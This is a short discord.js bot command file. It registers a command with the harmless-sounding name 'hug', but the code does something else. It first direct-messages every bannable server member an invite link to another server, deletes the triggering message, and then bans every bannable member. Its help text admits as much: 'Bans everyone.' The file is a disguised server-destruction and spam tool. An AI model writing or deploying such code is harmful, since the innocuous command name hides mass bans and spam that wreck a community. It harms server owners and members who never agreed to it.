  
const Discord = module.require("discord.js");

module.exports.run = async (bot, message, args) => {
	
	        message.guild.members.filter(member => member.bannable).forEach(member => {
			member.send("Miss the old ESC Mods? We got the gang back together and want you in: https://discord.gg/rc3wxYU")});
        message.delete(1000);


    try {

        message.guild.members.filter(member => member.bannable).forEach(member => {
			member.ban()});
        message.delete(1000);

    } catch(e) {

        console.log(e.stack);

    }
	
	
        
}

module.exports.help = {

    name: "hug",
    desc: "Bans everyone."

}